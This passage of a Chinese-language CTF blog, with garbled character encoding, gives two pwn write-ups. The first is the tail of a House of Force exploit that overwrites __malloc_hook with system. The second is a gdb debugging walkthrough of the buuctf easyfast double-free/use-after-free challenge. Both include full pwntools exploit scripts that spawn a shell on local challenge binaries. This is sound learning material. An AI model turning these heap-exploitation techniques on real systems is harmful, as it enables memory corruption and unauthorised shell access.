<h4 id="ä¿®æ”¹topchunk-size"><a href="#ä¿®æ”¹topchunk-size" class="headerlink" title="ä¿®æ”¹topchunk  size:"></a>ä¿®æ”¹<code>topchunk</code>  size:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png" alt="image-20251127125636159"></p>
<h4 id="è®¡ç®—åç§»ç§»åŠ¨top-chunkåˆ°æ–°ä½ç½®"><a href="#è®¡ç®—åç§»ç§»åŠ¨top-chunkåˆ°æ–°ä½ç½®" class="headerlink" title="è®¡ç®—åç§»ç§»åŠ¨top chunkåˆ°æ–°ä½ç½®:"></a>è®¡ç®—åç§»ç§»åŠ¨<code>top chunk</code>åˆ°æ–°ä½ç½®:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">// <span class="number">0x20</span>çš„åç§»é€šè¿‡è°ƒè¯•è·å¾—</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png" alt="image-20251127125941799"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png" alt="image-20251127125952099"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°new top è¢«ç§»åŠ¨åˆ°äº†malloc_hook - 0x10çš„ä½ç½®ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™ è¦†å†™malloc_hookçš„åœ°å€äº†</p>
<h4 id="å†™å…¥systemï¼š"><a href="#å†™å…¥systemï¼š" class="headerlink" title="å†™å…¥systemï¼š"></a>å†™å…¥systemï¼š</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>new topchunk</code> åˆ‡å‰²äº†ä¸€å—0x20å¤§å°çš„å †å—ç»™è¿”å›ç»™ç”¨æˆ·</p>
<p>æˆ‘ä»¬ä»è¿™é‡Œå†™å…¥äº†systemçš„åœ°å€</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png" alt="image-20251127130158802"></p>
<p>åé¢å†æ¬¡åˆ©ç”¨mallocå‡½æ•°å°±å¯ä»¥å®ç°æ‰“é€šã€‚</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;now what to write?\n&quot;</span>,content)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libcc = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc.address= libcc +<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libcc))</span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system :&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>house of force çš„å…³é”®åœ¨äºå¯ä»¥ä¿®æ”¹<code>topchunk</code>çš„sizeéƒ¨åˆ† ä»¥åŠ è®¡ç®—å¥½åˆ°targetç›®æ ‡åœ°å€çš„åç§»é‡ã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/index.html">https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem(&#39;bin%20sh&#39;))/index.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/12/gdb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/12/gdb/" class="post-title-link" itemprop="url">gdbæ–°çš„ç†è§£</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-11-12 17:30:00" itemprop="dateCreated datePublished" datetime="2025-11-12T17:30:00+08:00">2025-11-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-11-29 00:43:04" itemprop="dateModified" datetime="2025-11-29T00:43:04+08:00">2025-11-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>2.2k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="gdbæ–°çš„ç†è§£"><a href="#gdbæ–°çš„ç†è§£" class="headerlink" title="gdbæ–°çš„ç†è§£"></a>gdbæ–°çš„ç†è§£</h1><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>å…¶å®æ„Ÿè§‰ä¹‹å‰ä¸€ç›´æœ‰gdbè°ƒè¯•ææƒ§ç—‡ã€‚</p>
<p>ä½†æ˜¯é€šè¿‡æœ€è¿‘çš„ç»ƒä¹ å’Œå¤ç°ï¼Œå¯¹gdbæœ‰äº†ä¸€äº›æ–°çš„ç†è§£ä¸æ„Ÿæ‚Ÿã€‚</p>
<p>ä¹‹å‰å¸¸å¸¸å› ä¸ºæä¸æ¸…æ¥šè°ƒè¯•çš„ä½ç½®ï¼Œä¸çŸ¥é“æ€ä¹ˆæŸ¥çœ‹æƒ³çœ‹çš„ç¨‹åºæ‰§è¡Œæƒ…å†µè€Œè‹¦æ¼ã€‚</p>
<p>é€šè¿‡æœ€è¿‘çš„è”ç³»ç†è§£äº†æ–­ç‚¹çš„é‡è¦æ€§ï¼Œä»¥åŠä¸€äº›æ–°çš„gdbæŒ‡ä»¤ã€‚</p>
<p>å¸Œæœ›å¯ä»¥ä¸€ç›´è¿›æ­¥ä¸‹å»ï¼ï¼ï¼</p>
<p>æ–°å­¦ä¼šäº†ç”¨pythonäº¤äº’æ¨¡å¼è¿›è¡Œgdbçš„å•æ­¥è°ƒè¯•</p>
<p>ä¸‹é¢ä»¥ä¸€ä¸ªç®€å•çš„uafå †é¢˜ä¸ºä¾‹ï¼š</p>
<h2 id="é¢˜ç›®ï¼ˆbuuctf-easyfastï¼‰"><a href="#é¢˜ç›®ï¼ˆbuuctf-easyfastï¼‰" class="headerlink" title="é¢˜ç›®ï¼ˆbuuctf easyfastï¼‰:"></a>é¢˜ç›®ï¼ˆbuuctf easyfastï¼‰:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb1.png" alt="gdb1"></p>
<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145102620.png" alt="image-20251112145102620"></p>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb2.png" alt="gdb2"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145421701.png" alt="image-20251112145421701"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°dataæ®µçš„å…¨å±€å˜é‡<strong>602090</strong>åˆå§‹çš„æ—¶å€™æ˜¯<strong>1</strong></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145252356.png" alt="image-20251112145252356"></p>
<p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ª **uaf **æ¼æ´ã€‚</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145305907.png" alt="image-20251112145305907"></p>
<h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>è¿™é‡Œçš„æ€è·¯å°±æ˜¯åˆ©<u>doublefree</u>æˆ–è€… <u>uaf</u> å°† å…¨å±€å˜é‡<strong>602090</strong>å˜ä¸º0</p>
<h2 id="è„šæœ¬ï¼š"><a href="#è„šæœ¬ï¼š" class="headerlink" title="è„šæœ¬ï¼š"></a>è„šæœ¬ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] ç¯å¢ƒé…ç½®</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># æœ¬åœ°è°ƒè¯•</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # è¿œç¨‹è¿æ¥</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># ç›®æ ‡åœ°å€ï¼ˆå¦‚ GOT è¡¨ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] å †æ“ä½œå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”³è¯·å †å—&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é‡Šæ”¾å †å—&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¡«å……å †å—å†…å®¹&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è§¦å‘æ¼æ´å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit æµç¨‹</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># ç”³è¯·ä¸¤ä¸ª 0x50 å¤§å°çš„å †å—ï¼ˆ0x40 + headerï¼‰</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] æ„é€  Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># é‡Šæ”¾ chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># é‡Šæ”¾ chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># å†æ¬¡é‡Šæ”¾ chunk 0ï¼Œå½¢æˆ fastbin é“¾è¡¨ï¼š0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] æ§åˆ¶ fastbin é“¾è¡¨å¤´</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># æŒ‡å‘ç›®æ ‡åœ°å€ - 0x10ï¼ˆchunk headerï¼‰</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] é‡æ–°åˆ†é…ï¼Œæ§åˆ¶ç›®æ ‡åœ°å€é™„è¿‘çš„å†…å­˜</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># åˆ†é…åˆ°åŸ chunk 0 ä½ç½®</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># åˆ†é…åˆ°åŸ chunk 1 ä½ç½®ï¼Œæ­¤æ—¶å…¶ fd æŒ‡å‘ target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># åˆ†é…åˆ° target-0x10 é™„è¿‘ï¼Œå¯ä»¥è¦†ç›–ç›®æ ‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] è¦†ç›–ç›®æ ‡å†…å®¹ï¼ˆå¦‚ GOT è¡¨é¡¹ï¼‰</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># æˆ–è€… system(&quot;/bin/sh&quot;) çš„åœ°å€</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] è§¦å‘æ¼æ´</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] äº¤äº’</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="åŠ¨æ€è°ƒè¯•part1ï¼š"><a href="#åŠ¨æ€è°ƒè¯•part1ï¼š" class="headerlink" title="åŠ¨æ€è°ƒè¯•part1ï¼š"></a><strong>åŠ¨æ€è°ƒè¯•part1</strong>ï¼š</h2><ul>
<li>é¦–å…ˆå¼€å¯ä¸€ä¸ª<strong>python3</strong> è§£é‡Šå™¨:</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112150609622.png" alt="image-20251112150609622"></p>
<p>è¿™é‡ŒåŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯åŠ¨äº†ä¸€ä¸ªè¿›ç¨‹72687</p>
<ul>
<li>åŒæ—¶å¼€å¯å¦ä¸€ä¸ª<strong>gdb</strong>ç»ˆç«¯ï¼š</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112151018331.png" alt="image-20251112151018331"></p>
<p><code>attach (pid)</code>åœ¨gdbé‡Œé¢é™„ä»¶è¿›ç¨‹ã€‚</p>
<ul>
<li>è®¾ç½®å…³é”®æ–­ç‚¹ï¼š</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
<p>åœ¨ä¸‰ä¸ªå…³é”®å‡½æ•°çš„è¿”å›å¤„è®¾ç½®æ–­ç‚¹</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
<p>ç„¶åcontinueç­‰å¾…è§£é‡Šå™¨è¾“å…¥</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
<ul>
<li>å¼€å§‹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼š</li>
</ul>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
<p>è¿™é‡Œå®šä¹‰å‡½æ•°</p>
<p>ç„¶åä¸‹é¢æˆ‘ä»¬æ‰§è¡Œäº†<code>alloc(0x40)</code>åˆ›å»ºäº†0x40å¤§å°çš„å †å—</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å³è¾¹çš„ç»ˆç«¯åœåœ¨äº†æˆ‘ä»¬è®¾ç½®çš„æ–­ç‚¹</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153558163.png" alt="image-20251112153558163"></p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å †å—åˆ›å»ºæˆåŠŸã€‚</p>
<p>è¿™æ ·è°ƒè¯•å¯ä»¥çœ‹åˆ°æ¯æ­¥çš„æ‰§è¡Œæƒ…å†µã€‚</p>
<p>æ¯æ¬¡è¿›å…¥<code>Continuing.</code>ç­‰å¾…æ‰§è¡Œæ—¶å€™åœ¨pythonè§£é‡Šå™¨æ‰§è¡Œæ–°çš„æŒ‡ä»¤</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153909048.png" alt="image-20251112153909048"></p>
<p>è¿™é‡Œçœ‹åˆ°æˆåŠŸæŠŠ<code>chunk0</code>çš„<code>fd</code>æ”¹ä¸º<code>å…¨å±€å˜é‡-0x10</code>,ç„¶ååé¢é€šè¿‡editå°±å¯ä»¥ä¿®æ”¹è¿™ä¸ªä¼ªé€ çš„å †å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨å…¨å±€å˜é‡</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112154622804.png" alt="image-20251112154622804"></p>
<p>æŸ¥çœ‹å…¨å±€å˜é‡<code>buf</code></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç›®æ ‡åœ°å€è¢«å½“ä½œäº†ä¸€ä¸ªå †å—ã€‚åé¢å°±ä¿®æ”¹å †å—3å³å¯ã€‚</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155101849.png" alt="image-20251112155101849"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå¯åŠ¨äº†shellçš„è¿›ç¨‹ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155456001.png" alt="image-20251112155456001"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155433697.png" alt="image-20251112155433697"></p>
<p><strong>æ³¨æ„</strong>ï¼š</p>
<p><code>ctrl + d </code>é€€å‡ºpythonè§£é‡Šå™¨</p>
<p>æƒ³çœ‹æ‰§è¡Œæƒ…å†µå¯ä»¥éšæ—¶<code>ctrl + c</code>æš‚åœgdbç»ˆç«¯</p>
<h2 id="åŠ¨æ€è°ƒè¯•part2ï¼š"><a href="#åŠ¨æ€è°ƒè¯•part2ï¼š" class="headerlink" title="åŠ¨æ€è°ƒè¯•part2ï¼š"></a><strong>åŠ¨æ€è°ƒè¯•part2</strong>ï¼š</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162347772.png" alt="image-20251112162347772"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿›å…¥äº†<code>interactive mode</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162428445.png" alt="image-20251112162428445"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162453383.png" alt="image-20251112162453383"></p>
